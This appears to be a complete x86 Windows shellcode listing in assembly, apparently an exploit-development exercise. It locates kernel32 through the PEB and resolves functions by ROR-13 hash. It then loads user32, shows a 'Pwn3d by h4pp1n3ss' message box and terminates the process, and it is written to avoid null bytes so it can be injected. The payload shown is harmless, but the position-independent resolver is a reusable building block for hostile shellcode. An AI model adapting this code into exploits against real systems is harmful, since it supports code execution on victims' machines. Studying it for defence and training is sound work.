start:                                 
    mov   ebp, esp                   #
    add   esp, 0xfffff9f0            #   Avoid NULL bytes

find_kernel32:                     
    xor   ecx, ecx                   #   ECX = 0
    mov   esi,fs:[ecx+0x30]          #   ESI = &(PEB) ([FS:0x30])
    mov   esi,[esi+0x0C]             #   ESI = PEB->Ldr
    mov   esi,[esi+0x1C]             #   ESI = PEB->Ldr.InInitOrder

next_module:                       
    mov   ebx, [esi+0x08]            #   EBX = InInitOrder[X].base_address
    mov   edi, [esi+0x20]            #   EDI = InInitOrder[X].module_name
    mov   esi, [esi]                 #   ESI = InInitOrder[X].flink (next)
    cmp   [edi+12*2], cx             #   (unicode) modulename[12] == 0x00 ?
    jne   next_module                #   No: try next module

find_function_shorten:             
    jmp find_function_shorten_bnc    #   Short jump

find_function_ret:                 
    pop esi                          #   POP the return address from the stack
    mov   [ebp+0x04], esi            #   Save find_function address for later usage
    jmp resolve_symbols_kernel32     #

find_function_shorten_bnc:            
    call find_function_ret           #   Relative CALL with negative offset

find_function:                     
    pushad                           #   Save all registers
    mov   eax, [ebx+0x3c]            #   Offset to PE Signature
    mov   edi, [ebx+eax+0x78]        #   Export Table Directory RVA
    add   edi, ebx                   #   Export Table Directory VMA
    mov   ecx, [edi+0x18]            #   NumberOfNames
    mov   eax, [edi+0x20]            #   AddressOfNames RVA
    add   eax, ebx                   #   AddressOfNames VMA
    mov   [ebp-4], eax               #   Save AddressOfNames VMA for later

find_function_loop:                
    jecxz find_function_finished     #   Jump to the end if ECX is 0
    dec   ecx                        #   Decrement our names counter
    mov   eax, [ebp-4]               #   Restore AddressOfNames VMA
    mov   esi, [eax+ecx*4]           #   Get the RVA of the symbol name
    add   esi, ebx                   #   Set ESI to the VMA of the current symbol name

compute_hash:                      
    xor   eax, eax                   #   NULL EAX
    cdq                              #   NULL EDX
    cld                              #   Clear direction

compute_hash_again:                
    lodsb                            #   Load the next byte from esi into al
    test  al, al                     #   Check for NULL terminator
    jz    compute_hash_finished      #   If the ZF is set, we've hit the NULL term
    ror   edx, 0x0d                  #   Rotate edx 13 bits to the right
    add   edx, eax                   #   Add the new byte to the accumulator
    jmp   compute_hash_again         #   Next iteration

compute_hash_finished:             

find_function_compare:             
    cmp   edx, [esp+0x24]            #   Compare the computed hash with the requested hash
    jnz   find_function_loop         #   If it doesn't match go back to find_function_loop
    mov   edx, [edi+0x24]            #   AddressOfNameOrdinals RVA
    add   edx, ebx                   #   AddressOfNameOrdinals VMA
    mov   cx,  [edx+2*ecx]           #   Extrapolate the function's ordinal
    mov   edx, [edi+0x1c]            #   AddressOfFunctions RVA
    add   edx, ebx                   #   AddressOfFunctions VMA
    mov   eax, [edx+4*ecx]           #   Get the function RVA
    add   eax, ebx                   #   Get the function VMA
    mov   [esp+0x1c], eax            #   Overwrite stack version of eax from pushad

find_function_finished:            
    popad                            #   Restore registers
    ret                              #

resolve_symbols_kernel32:        
    push 0xec0e4e8e                  #   LoadLibraryA hash
    call dword ptr [ebp+0x04]        #   Call find_function
    mov   [ebp+0x10], eax            #   Save LoadLibraryA address for later usage
    push 0x78b5b983                  #   TerminateProcess hash
    call dword ptr [ebp+0x04]        #   Call find_function
    mov   [ebp+0x14], eax            #   Save TerminateProcess address for later usage

load_user32_lib:                 
    xor eax, eax                     #  EAX = Null
    mov ax, 0x6c6c;                  
    push eax;                        # Stack = "ll"
    push dword 0x642e3233;           # Stack = "32.dll"
    push dword 0x72657355;           # Stack = "User32.dll"
    push esp                         # Stack = &("User32.dll")
    call dword ptr [ebp+0x10]        # Call LoadLibraryA

resolve_symbols_user32:        
    mov   ebx, eax                  #  Move the base address of user32.dll to EBX
    push 0xbc4da2a8                 #  MessageBoxA hash
    call dword ptr [ebp+0x04]       #  Call find_function
    mov   [ebp+0x18], eax           #  Save MessageBoxA address for later usage

call_MessageBoxA:                  
    xor eax, eax                    # EAX = NULL
    mov ax, 0x7373                  # "ss"
    push eax                        # Stack = "ss"
    push dword 0x336e3170           # Stack = "p1n3ss"
    push dword 0x70346820           # Stack = " h4pp1n3ss"
    push dword 0x79622064           # Stack = "d by h4pp1n3ss"
    push dword 0x336e7750           # Stack = "Pwn3d by h4pp1n3ss"
    push esp                        # Stack = &("Pwn3d by h4pp1n3ss")
    mov ebx, [esp]                  # EBX = &(push_inst_greetings)
    xor eax, eax                    # EAX = NULL
    push eax                        # uType
    push ebx                        # lpCaption
    push ebx                        # lpText
    push eax                        # hWnd
    call dword ptr [ebp+0x18]       # Call MessageBoxA

call_TerminateProcess:             
    xor eax, eax                    #  EAX = null
    push eax                        #  uExitCode
    push 0xffffffff                 #  hProcess
    call dword ptr [ebp+0x14]       #  Call TerminateProcess